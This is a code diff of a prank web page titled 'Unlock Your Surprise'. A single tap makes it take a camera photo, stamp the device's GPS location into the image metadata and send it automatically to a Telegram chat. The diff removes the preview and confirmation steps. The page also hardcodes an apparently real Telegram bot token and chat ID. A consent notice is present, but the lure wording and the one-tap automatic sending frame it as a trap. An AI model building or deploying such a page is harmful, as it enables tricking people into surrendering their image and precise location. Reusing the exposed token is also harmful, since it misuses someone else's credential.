@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>A Little Surprise 🎁</title>
+<title>Unlock Your Surprise 🎁</title>
 
 <script src="https://cdn.jsdelivr.net/npm/piexifjs@1.0.6/piexif.js"></script>
 
@@ -42,7 +41,6 @@ button{
   border-radius:30px;background:#ed72ac;color:white;
   font-weight:bold;font-size:15px;cursor:pointer
 }
-button.secondary{background:#f8e2ee;color:#a44479}
 button:disabled{opacity:.5;cursor:wait}
 .notice{
   text-align:left;font-size:12px;line-height:1.5;
@@ -54,22 +52,18 @@ button:disabled{opacity:.5;cursor:wait}
   text-align:left;font-size:12px;line-height:1.5;margin:12px 2px
 }
 .consent input{margin-top:3px;accent-color:#dc5597}
-.status{min-height:38px;margin-top:12px;font-size:13px;
-  line-height:1.5;overflow-wrap:anywhere}
+.status{min-height:38px;margin-top:12px;font-size:13px;line-height:1.5;overflow-wrap:anywhere}
 .tiny{font-size:11px;color:#a17b94;line-height:1.5}
 [hidden]{display:none!important}
 
 .prank-popup{
-  position:fixed;inset:0;z-index:9999;
-  background:#2c0a20bb;display:flex;
-  align-items:center;justify-content:center;padding:22px
+  position:fixed;inset:0;z-index:9999;background:#2c0a20bb;
+  display:flex;align-items:center;justify-content:center;padding:22px
 }
 .prank-card{
-  width:100%;max-width:330px;padding:28px 22px;
-  border-radius:28px;background:#fff4fa;
-  color:#a12d70;text-align:center;
-  box-shadow:0 15px 50px #0004;
-  animation:pop .35s ease-out
+  width:100%;max-width:330px;padding:28px 22px;border-radius:28px;
+  background:#fff4fa;color:#a12d70;text-align:center;
+  box-shadow:0 15px 50px #0004;animation:pop .35s ease-out
 }
 .prank-card h2{font-size:34px;margin:12px 0}
 .prank-card p{line-height:1.5}
@@ -82,8 +76,8 @@ button:disabled{opacity:.5;cursor:wait}
 
 <body>
 <main class="app">
-  <h1>🎁 A Little Surprise!</h1>
-  <p class="subtitle">Something special is waiting for you 👀💗</p>
+  <h1>🎁 Unlock Your Surprise!</h1>
+  <p class="subtitle">A little surprise is waiting for you 👀💗</p>
 
   <div class="frame">
     <video id="camera" autoplay playsinline hidden></video>
@@ -95,9 +89,9 @@ button:disabled{opacity:.5;cursor:wait}
   </div>
 
   <div class="notice">
-    📸 Tapping the surprise button captures a photo and sends it,
-    together with your device's reported location, to the configured
-    Telegram chat automatically.
+    📸 Tapping the button opens your camera, takes a photo, and sends
+    it with your device's reported location to the configured Telegram
+    chat.
   </div>
 
   <label class="consent">
@@ -106,15 +100,13 @@ button:disabled{opacity:.5;cursor:wait}
     be sent to Telegram when I tap the surprise button.</span>
   </label>
 
-  <button id="startBtn" disabled>Open Camera ♡</button>
-  <button id="takeBtn" hidden>Get My Surprise 🎁</button>
-  <button id="retakeBtn" class="secondary" hidden>Try Again</button>
+  <button id="startBtn" disabled>🎁 Unlock Your Surprise</button>
 
   <div id="status" class="status" role="status">
     Agree to the photo and location sharing notice to begin.
   </div>
 
-  <p class="tiny">Your surprise is just one tap away ♡</p>
+  <p class="tiny">Ready for a little chaos? 😂 ♡</p>
 </main>
 
 <div id="prankPopup" class="prank-popup" hidden>
@@ -130,30 +122,26 @@ button:disabled{opacity:.5;cursor:wait}
 <script>
 "use strict";
 
-// Put your Telegram details here.
-// Warning: these values are visible in public website source code.
+// Replace these with your Telegram bot details.
+// WARNING: A token in public JavaScript can be copied by anyone.
 const BOT_TOKEN = "8799702650:AAH4KcrkJaFVVxlEAA6JkoepemAv2PRx_ZM";
 const CHAT_ID = "7350437667";
 
 const $ = id => document.getElementById(id);
-
 const camera = $("camera");
 const preview = $("preview");
 const placeholder = $("placeholder");
 const consent = $("consent");
 const startBtn = $("startBtn");
-const takeBtn = $("takeBtn");
-const retakeBtn = $("retakeBtn");
 const statusBox = $("status");
 const prankPopup = $("prankPopup");
 
 let stream = null;
 let imageCapture = null;
-let photoBlob = null;
 let previewUrl = null;
 let busy = false;
 
-function status(message) {
+function setStatus(message) {
   statusBox.textContent = message;
 }
 
@@ -169,76 +157,50 @@ function stopCamera() {
 function clearPreview() {
   if (previewUrl) URL.revokeObjectURL(previewUrl);
   previewUrl = null;
-  photoBlob = null;
   preview.removeAttribute("src");
   preview.hidden = true;
 }
 
 consent.addEventListener("change", () => {
-  startBtn.disabled = !consent.checked;
+  startBtn.disabled = !consent.checked || busy;
 });
 
 async function openCamera() {
-  if (!consent.checked || busy) return;
-
-  stopCamera();
-  clearPreview();
-
-  try {
-    if (!navigator.mediaDevices?.getUserMedia) {
-      throw new Error("Open this website over HTTPS in Chrome.");
-    }
-
-    status("Opening camera... ♡");
-
-    stream = await navigator.mediaDevices.getUserMedia({
-      audio: false,
-      video: {
-        facingMode: { ideal: "environment" },
-        width: { ideal: 4096 },
-        height: { ideal: 3072 }
-      }
-    });
-
-    camera.srcObject = stream;
-    camera.hidden = false;
-    placeholder.hidden = true;
-    await camera.play();
-
-    const track = stream.getVideoTracks()[0];
-
-    if ("ImageCapture" in window) {
-      try {
-        imageCapture = new ImageCapture(track);
-      } catch (_) {
-        imageCapture = null;
-      }
-    }
-
-    if (!imageCapture) {
-      throw new Error(
-        "Still-photo capture is unsupported in this browser. Try Chrome on Android."
-      );
-    }
-
-    startBtn.hidden = true;
-    takeBtn.hidden = false;
-    status("Ready! Tap Get My Surprise 🎁");
-  } catch (error) {
-    stopCamera();
-    camera.hidden = true;
-    placeholder.hidden = false;
-    startBtn.hidden = false;
-    status(error.message || "Could not open camera.");
+  if (!navigator.mediaDevices?.getUserMedia) {
+    throw new Error("Open this website over HTTPS in Chrome.");
   }
-}
 
-startBtn.addEventListener("click", openCamera);
+  setStatus("Opening camera... 📸");
+
+  stream = await navigator.mediaDevices.getUserMedia({
+    audio: false,
+    video: {
+      facingMode: { ideal: "environment" },
+      width: { ideal: 4096 },
+      height: { ideal: 3072 }
+    }
+  });
+
+  camera.srcObject = stream;
+  camera.hidden = false;
+  placeholder.hidden = true;
+  await camera.play();
+
+  const track = stream.getVideoTracks()[0];
+
+  if (!("ImageCapture" in window)) {
+    throw new Error(
+      "Automatic still-photo capture is unsupported here. Try Chrome on Android."
+    );
+  }
+
+  imageCapture = new ImageCapture(track);
+}
 
 function getLocation() {
   return new Promise((resolve, reject) => {
     if (!navigator.geolocation) {
-      reject(new Error("Location access is unavailable in this browser."));
+      reject(new Error("Location access is unavailable."));
       return;
     }
 
@@ -251,9 +213,9 @@ function getLocation() {
       }),
       e => reject(new Error(
         e.code === 1
-          ? "Location permission denied."
+          ? "Location permission denied. Allow location and retry."
           : e.code === 3
-          ? "Location timed out. Please try again."
+          ? "Location timed out. Please retry."
           : "Could not obtain your location."
       )),
       {
@@ -271,7 +233,7 @@ async function addGpsExif(blob, loc) {
   }
 
   if (blob.type && blob.type.toLowerCase() !== "image/jpeg") {
-    throw new Error("Camera did not return JPEG. GPS EXIF cannot be added.");
+    throw new Error("Camera did not return JPEG; cannot add GPS EXIF.");
   }
 
   const bytes = new Uint8Array(await blob.arrayBuffer());
@@ -336,7 +298,7 @@ async function sendToTelegram(blob) {
     BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" ||
     CHAT_ID === "YOUR_CHAT_ID"
   ) {
-    throw new Error("Configure your Telegram bot token and chat ID first.");
+    throw new Error("Configure your Telegram bot token and chat ID.");
   }
 
   const form = new FormData();
@@ -355,47 +317,58 @@ async function sendToTelegram(blob) {
   }
 }
 
-takeBtn.addEventListener("click", async () => {
-  if (!consent.checked || !imageCapture || busy) return;
+async function captureAndSend() {
+  // Get a location first, then capture the photo.
+  setStatus("Getting location... 📍");
+  const loc = await getLocation();
+
+  if (!imageCapture) {
+    throw new Error("Camera capture is not ready.");
+  }
+
+  setStatus("Capturing your surprise... 📸");
+  const rawPhoto = await imageCapture.takePhoto();
+
+  setStatus("Adding GPS metadata... ♡");
+  const photo = await addGpsExif(rawPhoto, loc);
+
+  previewUrl = URL.createObjectURL(photo);
+  preview.src = previewUrl;
+  preview.hidden = false;
+  camera.hidden = true;
+  placeholder.hidden = true;
+
+  stopCamera();
+
+  // Show the playful popup as soon as the photo is captured.
+  prankPopup.hidden = false;
+  setStatus("Surprise captured! Sending to Telegram... ♡");
+
+  // Send automatically; no second button or upload confirmation.
+  await sendToTelegram(photo);
+  setStatus("Prank delivered! Photo sent successfully 😂💗");
+}
+
+startBtn.addEventListener("click", async () => {
+  if (!consent.checked || busy) return;
 
   busy = true;
-  takeBtn.disabled = true;
+  startBtn.disabled = true;
 
   try {
-    status("Getting location... 📍");
-    const loc = await getLocation();
-
-    status("Capturing your surprise... 📸");
-    const rawPhoto = await imageCapture.takePhoto();
-
-    status("Adding GPS metadata...");
-    photoBlob = await addGpsExif(rawPhoto, loc);
-
-    previewUrl = URL.createObjectURL(photoBlob);
-    preview.src = previewUrl;
-    preview.hidden = false;
-    camera.hidden = true;
-    placeholder.hidden = true;
-
-    stopCamera();
-    takeBtn.hidden = true;
-    retakeBtn.hidden = false;
-
-    // Show the prank and send the photo automatically.
-    prankPopup.hidden = false;
-    status("Surprise captured! Sending to Telegram... ♡");
-
-    await sendToTelegram(photoBlob);
-    status("Prank delivered! Photo sent successfully 😂💗");
+    await openCamera();
+    await captureAndSend();
   } catch (error) {
-    status(error.message || "Could not complete the surprise.");
+    stopCamera();
+    camera.hidden = true;
+    placeholder.hidden = false;
+    startBtn.hidden = false;
+    setStatus(error.message || "Could not complete the surprise.");
   } finally {
     busy = false;
-    takeBtn.disabled = false;
+    startBtn.disabled = !consent.checked;
   }
 });
-
-retakeBtn.addEventListener("click", openCamera);
 
 $("closePrank").addEventListener("click", () => {
   prankPopup.hidden = true;
